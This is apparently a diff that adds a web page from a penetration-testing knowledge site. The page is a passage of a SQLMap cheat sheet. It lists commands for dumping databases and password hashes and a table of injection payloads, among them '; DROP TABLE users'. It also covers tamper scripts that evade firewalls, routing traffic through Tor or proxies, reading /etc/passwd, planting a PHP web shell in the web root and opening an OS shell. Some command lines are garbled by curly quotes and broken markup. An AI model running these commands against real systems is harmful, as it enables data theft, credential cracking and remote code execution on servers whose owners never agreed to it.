+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap -u "http://target.com/?id=1" --schema</code></li>
+</ul>
+<code>sqlmap -u "http://target.com/?id=1" --search -T user</code>    — all tables containing "user"
+<code>sqlmap -u "http://target.com/?id=1" --search -C pass</code>    — all columns containing "pass"
+</div>
+</details>
+<h3 id="password-enumeration-and-cracking">Password Enumeration and Cracking</h3>
+<p>SQLMap automatically attempts dictionary-based cracking (31 hash algorithms, 1.4M entries) when it encounters password hashes during a dump. <code>--passwords</code> targets DB-level user credential tables. <code>--all</code> combined with <code>--batch</code> retrieves everything accessible without prompts — useful for coverage but output must be reviewed manually.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap -u "http://target.com/?id=1" --dump -D master -T users --batch</code></li>
+  <li><code>sqlmap -u "http://target.com/?id=1" --passwords --batch</code></li>
+  <li><code>sqlmap -u "http://target.com/?id=1" --all --batch</code></li>
+</ul>
+</div>
+</details>
+<hr>
+<h2 id="injection-type-detection-reference">Injection Type Detection Reference</h2>
+<p>SQLMap reports detected injection types using <code>BEUSTQ</code> notation in its output. See <a href="/techniques/SQL-Injection">SQL Injection</a> for full details on each type.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Code</th><th>Type</th><th>Example Payload</th></tr></thead><tbody><tr><td><code>B</code></td><td>Boolean-based blind</td><td><code>AND 1=1</code></td></tr><tr><td><code>E</code></td><td>Error-based</td><td><code>AND GTID_SUBSET(@@version,0)</code></td></tr><tr><td><code>U</code></td><td>UNION query-based</td><td><code>UNION ALL SELECT 1,@@version,3</code></td></tr><tr><td><code>S</code></td><td>Stacked queries</td><td><code>; DROP TABLE users</code></td></tr><tr><td><code>T</code></td><td>Time-based blind</td><td><code>AND 1=IF(2>1,SLEEP(5),0)</code></td></tr><tr><td><code>Q</code></td><td>Inline queries</td><td><code>SELECT (SELECT @@version) from</code></td></tr></tbody></table>
+<hr>
+<h2 id="attack-tuning">Attack Tuning</h2>
+<h3 id="level-and-risk">Level and Risk</h3>
+<p>Default run tests 72 payloads. Level 5 + Risk 3 expands to 7,865 — only use when the default run fails or the target requires OR-based payloads (e.g., login forms). Risk 3 enables OR payloads, which can cause data loss on writable SQL statements, so use carefully.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap -u "http://target.com/?id=1" --level=5 --risk=3 --batch</code></li>
+</ul>
+<code>sqlmap -u "http://target.com/?id=1" --level=5 --risk=3 -v 3 --batch</code>   — -v 3 shows [PAYLOAD] lines
+</div>
+</details>
+<h3 id="prefix-and-suffix">Prefix and Suffix</h3>
+<p>Use when the vulnerable query wraps the parameter in characters that break standard boundary detection. The prefix/suffix enclose every vector payload.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap -u "http://target.com/?q=test" --prefix="%'))" --suffix="-- -" --batch</code></li>
+</ul>
+<p>Example: target query is <code>WHERE id LIKE ((’</code> + input + <code>’))</code> — prefix closes the brackets, suffix comments the rest out.</p>
+</div>
+</details>
+<h3 id="technique-selection">Technique Selection</h3>
+<p>Force specific injection type(s) to skip slow or disruptive techniques.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<p><code>sqlmap -u “<a href="http://target.com/?id=1">http://target.com/?id=1</a>” —technique=BEU —batch</code>   — skip time-based and stacked
+<code>sqlmap -u “<a href="http://target.com/?id=1">http://target.com/?id=1</a>” —technique=E —batch</code>     — error-based only</p>
+</div>
+</details>
+<h3 id="union-tuning">UNION Tuning</h3>
+<p>Provide column count, fill character, or a required FROM appendix when SQLMap fails UNION detection automatically.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap -u "http://target.com/?id=1" --union-cols=3 --batch</code></li>
+  <li><code>sqlmap -u "http://target.com/?id=1" --union-char='a' --batch</code></li>
+</ul>
+<code>sqlmap -u "http://target.com/?id=1" --union-from=dual --batch</code>   — required on Oracle
+</div>
+</details>
+<h3 id="response-differentiation">Response Differentiation</h3>
+<p>When TRUE/FALSE responses differ only subtly, pin detection to a specific signal rather than full response comparison.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<p><code>sqlmap -u “<a href="http://target.com/?id=1">http://target.com/?id=1</a>” —code=200 —batch</code>          — HTTP 200 = TRUE
+<code>sqlmap -u “<a href="http://target.com/?id=1">http://target.com/?id=1</a>” —titles —batch</code>            — compare <title> tags
+&#x3C;code>sqlmap -u “http://target.com/?id=1</title>” —string=“Welcome” —batch  — string present in TRUE only
+<code>sqlmap -u “<a href="http://target.com/?id=1">http://target.com/?id=1</a>” —text-only —batch</code>         — strip all HTML tags</p>
+</div>
+</details>
+<hr>
+<h2 id="bypassing-web-application-protections">Bypassing Web Application Protections</h2>
+<h3 id="anti-csrf-token-bypass">Anti-CSRF Token Bypass</h3>
+<p>SQLMap re-fetches the target page before each request to parse a fresh token value. Specify the token parameter name via <code>--csrf-token</code>.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap -r req.txt --csrf-token="csrf_token" --batch</code></li>
+</ul>
+</div>
+</details>
+<h3 id="unique-value-bypass">Unique Value Bypass</h3>
+<p>Some apps require a unique parameter per request to detect and block automation. <code>--randomize</code> generates a new random value for that parameter on every request.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap -u "http://target.com/?id=1&#x26;rp=29125" --randomize=rp --batch -v 5</code></li>
+</ul>
+</div>
+</details>
+<h3 id="calculated-parameter-bypass">Calculated Parameter Bypass</h3>
+<p>When one parameter must be a computed hash of another (e.g., <code>h=MD5(id)</code>), use <code>--eval</code> to run Python code before each request to set the correct value.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap -u "http://target.com/?id=1&#x26;h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch</code></li>
+</ul>
+</div>
+</details>
+<h3 id="ip-concealment">IP Concealment</h3>
+<p>Route through a proxy or Tor to hide source IP or bypass IP blacklists. Proxy lists are cycled sequentially.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap -u "http://target.com/?id=1" --proxy="socks4://<proxy-ip>:<port>" --batch</port></proxy-ip></code></li>
+  <li><code>sqlmap -u "http://target.com/?id=1" --proxy-file=proxies.txt --batch</code></li>
+  <li><code>sqlmap -u "http://target.com/?id=1" --tor --check-tor --batch</code></li>
+</ul>
+</div>
+</details>
+<h3 id="user-agent-blacklist-bypass">User-Agent Blacklist Bypass</h3>
+<p>The default SQLMap User-Agent (<code>sqlmap/1.4.9</code>) is on most WAF block lists. Always use <code>--random-agent</code> if encountering immediate 5XX errors.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap -u "http://target.com/?id=1" --random-agent --batch</code></li>
+</ul>
+</div>
+</details>
+<h3 id="waf-detection-and-bypass">WAF Detection and Bypass</h3>
+<p>SQLMap auto-identifies WAFs using the identYwaf library (80+ signatures). Use <code>--skip-waf</code> to suppress this step and reduce fingerprinting noise on the wire.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap -u "http://target.com/?id=1" --skip-waf --batch</code></li>
+</ul>
+</div>
+</details>
+<h3 id="tamper-scripts">Tamper Scripts</h3>
+<p>Python scripts that transform payloads in-flight to evade WAF/IPS signatures. Chain multiple with commas; SQLMap applies them in predefined priority order.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap -u "http://target.com/?id=1" --tamper=between,randomcase --batch</code></li>
+</ul>
+<code>sqlmap --list-tampers</code>   — full list with descriptions
+</div>
+</details>
+<h4 id="notable-tamper-scripts">Notable Tamper Scripts</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Tamper Script</th><th>Description</th></tr></thead><tbody><tr><td><code>0eunion</code></td><td>Replaces <code>UNION</code> with <code>e0UNION</code></td></tr><tr><td><code>base64encode</code></td><td>Base64-encodes the entire payload</td></tr><tr><td><code>between</code></td><td>Replaces <code>></code> with <code>NOT BETWEEN 0 AND #</code> and <code>=</code> with <code>BETWEEN # AND #</code></td></tr><tr><td><code>commalesslimit</code></td><td>Replaces <code>LIMIT M, N</code> with <code>LIMIT N OFFSET M</code> (MySQL)</td></tr><tr><td><code>equaltolike</code></td><td>Replaces all <code>=</code> with <code>LIKE</code></td></tr><tr><td><code>halfversionedmorekeywords</code></td><td>Adds versioned comment before each keyword (MySQL)</td></tr><tr><td><code>modsecurityversioned</code></td><td>Wraps full query in versioned comment (MySQL)</td></tr><tr><td><code>modsecurityzeroversioned</code></td><td>Wraps full query in zero-versioned comment (MySQL)</td></tr><tr><td><code>percentage</code></td><td>Adds <code>%</code> before each character — <code>SELECT</code> becomes <code>%S%E%L%E%C%T</code></td></tr><tr><td><code>plus2concat</code></td><td>Replaces <code>+</code> with <code>CONCAT()</code> (MSSQL)</td></tr><tr><td><code>randomcase</code></td><td>Randomizes keyword casing — <code>SELECT</code> becomes <code>SEleCt</code></td></tr><tr><td><code>space2comment</code></td><td>Replaces spaces with <code>/**/</code></td></tr><tr><td><code>space2dash</code></td><td>Replaces spaces with <code>--&#x3C;random>\n</code></td></tr><tr><td><code>space2hash</code></td><td>Replaces spaces with <code>#&#x3C;random>\n</code> (MySQL)</td></tr><tr><td><code>space2mssqlblank</code></td><td>Replaces spaces with random blank chars (MSSQL)</td></tr><tr><td><code>space2plus</code></td><td>Replaces spaces with <code>+</code></td></tr><tr><td><code>space2randomblank</code></td><td>Replaces spaces with random blank characters</td></tr><tr><td><code>symboliclogical</code></td><td>Replaces <code>AND</code>/<code>OR</code> with <code>&#x26;&#x26;</code>/<code>||</code></td></tr><tr><td><code>versionedkeywords</code></td><td>Wraps non-function keywords in versioned comments (MySQL)</td></tr><tr><td><code>versionedmorekeywords</code></td><td>Wraps all keywords in versioned comments (MySQL)</td></tr></tbody></table>
+<h3 id="chunked-transfer-encoding">Chunked Transfer Encoding</h3>
+<p>Splits the POST request body into chunks so blacklisted SQL keywords straddle chunk boundaries and are not matched by pattern-based WAFs.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap -u "http://target.com/?id=1" --data 'uid=1' --chunked --batch</code></li>
+</ul>
+</div>
+</details>
+<h3 id="http-parameter-pollution-hpp">HTTP Parameter Pollution (HPP)</h3>
+<p>Splits the payload across duplicate parameter names. Target platforms like ASP/IIS concatenate them server-side, reconstructing the full payload after inspection.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Example:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>?id=1&#x26;id=UNION&#x26;id=SELECT&#x26;id=username,password&#x26;id=FROM&#x26;id=users</code></li>
+</ul>
+</div>
+</details>
+<hr>
+<h2 id="error-handling-and-debugging">Error Handling and Debugging</h2>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<p><code>sqlmap -u “<a href="http://target.com/?id=1">http://target.com/?id=1</a>” —parse-errors —batch</code>              — show DBMS errors inline
+<code>sqlmap -u “<a href="http://target.com/?id=1">http://target.com/?id=1</a>” -t traffic.txt —batch</code>              — save raw traffic to file
+<code>sqlmap -u “<a href="http://target.com/?id=1">http://target.com/?id=1</a>” -v 3 —batch</code>                        — show payloads in output
+<code>sqlmap -u “<a href="http://target.com/?id=1">http://target.com/?id=1</a>” -v 6 —batch</code>                        — maximum verbosity
+<code>sqlmap -u “<a href="http://target.com/?id=1">http://target.com/?id=1</a>” —proxy=“<a href="http://127.0.0.1:8080">http://127.0.0.1:8080</a>” —batch</code>  — route through Burp</p>
+</div>
+</details>
+<hr>
+<h2 id="os-exploitation">OS Exploitation</h2>
+<p>Requires DBA privileges or the <code>FILE</code> privilege (MySQL). File reads are more commonly available; file writes require <code>secure-file-priv</code> to be disabled and write permission on the target directory.</p>
+<h3 id="file-read">File Read</h3>
+<p>Reads a server-side file via the SQL injection vulnerability and saves it to the local SQLMap output directory.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap -u "http://target.com/?id=1" --is-dba --batch</code></li>
+  <li><code>sqlmap -u "http://target.com/?id=1" --file-read "/etc/passwd" --batch</code></li>
+</ul>
+Output saved to: <code>~/.sqlmap/output/<host>/files/_etc_passwd</host></code>
+</div>
+</details>
+<h3 id="file-write--web-shell-upload">File Write / Web Shell Upload</h3>
+<p>Writes a local file to a path on the server. Most commonly used to plant a PHP web shell for code execution.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>echo '<!--?php system($_GET["cmd"]); ?-->' > shell.php</code></li>
+  <li><code>sqlmap -u "http://target.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php" --batch</code></li>
+  <li><code>curl http://target.com/shell.php?cmd=id</code></li>
+</ul>
+</div>
+</details>
+<h3 id="os-shell">OS Shell</h3>
+<p>Attempts to establish an interactive OS shell using the best available method — web shell write, UDF (User-Defined Function), or <code>xp_cmdshell</code> on MSSQL. If UNION technique fails, fall back to error-based.</p>
+<details class="callout callout-info">
+<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Commands:</span></summary>
+<div class="callout-body">
+<ul class="callout-list">
+  <li><code>sqlmap -u "http://target.com/?id=1" --os-shell --batch</code></li>
+</ul>
+<code>sqlmap -u "http://target.com/?id=1" --os-shell --technique=E --batch</code>   — force error-based
+</div>
+</details>
+<hr>
+<h2 id="related-concepts">Related Concepts</h2>
+<ul>
+<li><a href="/knowledge/Web-Security/SQL-Fundamentals">SQL Fundamentals</a></li>
+<li><a href="/knowledge/Web-Security/OWASP-Top-10---2021">OWASP Top 10 - 2021</a></li>
+</ul>
+<h2 id="related-techniques">Related Techniques</h2>
+<ul>
+<li><a href="/techniques/SQL-Injection">SQL Injection</a></li>
+</ul>
+<h2 id="related-playbooks">Related Playbooks</h2>
+<ul>
+<li><a href="/playbooks/Linux-Pentest-Playbook">Linux Pentest Playbook</a></li>
+</ul>
+<hr>
+<h2 id="references--images">References / Images</h2>
+<ul>
+<li><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">https://github.com/sqlmapproject/sqlmap/wiki/Usage</a></li>
+</ul>  </div> </main> <aside class="toc" id="toc" data-astro-cid-o5gmpz7g> <div class="toc-inner" data-astro-cid-o5gmpz7g> <p class="toc-label" data-astro-cid-o5gmpz7g>On this page</p> <aside id="toc-container"> <a href="#overview" class="toc-link toc-h2" data-heading="overview"> Overview </a><a href="#target--context" class="toc-link toc-h2" data-heading="target--context"> Target / Context </a><a href="#installation" class="toc-link toc-h2" data-heading="installation"> Installation </a><a href="#basic-usage" class="toc-link toc-h2" data-heading="basic-usage"> Basic Usage </a><a href="#flags--options" class="toc-link toc-h2" data-heading="flags--options"> Flags &amp; Options </a><a href="#common-use-cases" class="toc-link toc-h2" data-heading="common-use-cases"> Common Use Cases </a><a href="#get-based-testing" class="toc-link toc-h3" data-heading="get-based-testing"> GET-based Testing </a><a href="#post-based-testing" class="toc-link toc-h3" data-heading="post-based-testing"> POST-based Testing </a><a href="#full-http-request-file" class="toc-link toc-h3" data-heading="full-http-request-file"> Full HTTP Request File </a><a href="#curl-converted-request" class="toc-link toc-h3" data-heading="curl-converted-request"> cURL-converted Request </a><a href="#json--xml-body-testing" class="toc-link toc-h3" data-heading="json--xml-body-testing"> JSON / XML Body Testing </a><a href="#basic-db-enumeration" class="toc-link toc-h3" data-heading="basic-db-enumeration"> Basic DB Enumeration </a><a href="#table-and-row-enumeration" class="toc-link toc-h3" data-heading="table-and-row-enumeration"> Table and Row Enumeration </a><a href="#schema-and-search" class="toc-link toc-h3" data-heading="schema-and-search"> Schema and Search </a><a href="#password-enumeration-and-cracking" class="toc-link toc-h3" data-heading="password-enumeration-and-cracking"> Password Enumeration and Cracking </a><a href="#injection-type-detection-reference" class="toc-link toc-h2" data-heading="injection-type-detection-reference"> Injection Type Detection Reference </a><a href="#attack-tuning" class="toc-link toc-h2" data-heading="attack-tuning"> Attack Tuning </a><a href="#level-and-risk" class="toc-link toc-h3" data-heading="level-and-risk"> Level and Risk </a><a href="#prefix-and-suffix" class="toc-link toc-h3" data-heading="prefix-and-suffix"> Prefix and Suffix </a><a href="#technique-selection" class="toc-link toc-h3" data-heading="technique-selection"> Technique Selection </a><a href="#union-tuning" class="toc-link toc-h3" data-heading="union-tuning"> UNION Tuning </a><a href="#response-differentiation" class="toc-link toc-h3" data-heading="response-differentiation"> Response Differentiation </a><a href="#bypassing-web-application-protections" class="toc-link toc-h2" data-heading="bypassing-web-application-protections"> Bypassing Web Application Protections </a><a href="#anti-csrf-token-bypass" class="toc-link toc-h3" data-heading="anti-csrf-token-bypass"> Anti-CSRF Token Bypass </a><a href="#unique-value-bypass" class="toc-link toc-h3" data-heading="unique-value-bypass"> Unique Value Bypass </a><a href="#calculated-parameter-bypass" class="toc-link toc-h3" data-heading="calculated-parameter-bypass"> Calculated Parameter Bypass </a><a href="#ip-concealment" class="toc-link toc-h3" data-heading="ip-concealment"> IP Concealment </a><a href="#user-agent-blacklist-bypass" class="toc-link toc-h3" data-heading="user-agent-blacklist-bypass"> User-Agent Blacklist Bypass </a><a href="#waf-detection-and-bypass" class="toc-link toc-h3" data-heading="waf-detection-and-bypass"> WAF Detection and Bypass </a><a href="#tamper-scripts" class="toc-link toc-h3" data-heading="tamper-scripts"> Tamper Scripts </a><a href="#notable-tamper-scripts" class="toc-link toc-h4" data-heading="notable-tamper-scripts"> Notable Tamper Scripts </a><a href="#chunked-transfer-encoding" class="toc-link toc-h3" data-heading="chunked-transfer-encoding"> Chunked Transfer Encoding </a><a href="#http-parameter-pollution-hpp" class="toc-link toc-h3" data-heading="http-parameter-pollution-hpp"> HTTP Parameter Pollution (HPP) </a><a href="#error-handling-and-debugging" class="toc-link toc-h2" data-heading="error-handling-and-debugging"> Error Handling and Debugging </a><a href="#os-exploitation" class="toc-link toc-h2" data-heading="os-exploitation"> OS Exploitation </a><a href="#file-read" class="toc-link toc-h3" data-heading="file-read"> File Read </a><a href="#file-write--web-shell-upload" class="toc-link toc-h3" data-heading="file-write--web-shell-upload"> File Write / Web Shell Upload </a><a href="#os-shell" class="toc-link toc-h3" data-heading="os-shell"> OS Shell </a> </aside> </div> </aside> <div class="note-spacer" data-astro-cid-o5gmpz7g></div> </div>  </div> </body></html>  <script type="module">const e=document.getElementById("sidebar-toggle"),l=document.getElementById("sidebar");if(e&&l){let a=function(o){o?(l.setAttribute("data-collapsed",""),e.textContent="›",e.style.left="0px"):(l.removeAttribute("data-collapsed"),e.textContent="‹",e.style.left="240px")},t=localStorage.getItem("sidebar")==="1";a(t),e.addEventListener("click",()=>{t=!t,localStorage.setItem("sidebar",t?"1":"0"),a(t)})}</script> <script type="module">window.addEventListener("DOMContentLoaded",()=>{const c=document.querySelectorAll(".toc-link[data-heading]");if(!c.length)return;const d=["related concepts","related techniques","related tools","related playbooks","related knowledge","references","references / images","references/images"],o=Array.from(document.querySelectorAll(".note-content h1, .note-content h2, .note-content h3, .note-content h4")).filter(e=>{if(!e.id)return!1;const t=e.textContent.trim().toLowerCase();return!d.some(n=>t.includes(n))});if(!o.length)return;function r(e){c.forEach(n=>{n.classList.toggle("active",n.dataset.heading===e)});const t=document.querySelector(`.toc-link[data-heading="${e}"]`);t&&t.scrollIntoView({block:"nearest",behavior:"smooth"})}function i(){const e=window.scrollY,t=document.documentElement.scrollHeight,n=window.innerHeight,a=100;if(e+n>=t-10){r(o[o.length-1].id);return}let s=o[0];for(const l of o)l.getBoundingClientRect().top<=a&&(s=l);r(s.id)}window.addEventListener("scroll",i,{passive:!0}),i()});</script>
